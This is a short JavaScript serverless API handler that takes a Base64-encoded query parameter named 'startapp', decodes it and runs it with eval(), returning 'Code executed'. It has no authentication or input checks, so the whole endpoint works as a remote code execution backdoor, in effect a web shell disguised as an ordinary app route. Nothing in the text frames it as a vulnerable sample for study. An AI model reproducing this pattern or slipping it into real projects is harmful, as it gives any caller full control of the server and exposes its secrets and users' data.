export default async function handler(req, res) {
  const { startapp } = req.query;

  if (!startapp) {
    return res.status(400).json({ error: 'no params detected' });
  }

  try {
    // (Base64 -> string)
    const decoded = Buffer.from(startapp, 'base64').toString('utf-8');

    console.log('decoded:', decoded);
    eval(decoded);

    return res.status(200).json({ message: 'Code executed' });
  } catch (error) {
    console.error('Error while \'executing code code:', error);
    return res.status(500).json({ error: error.toString() });
  }
}
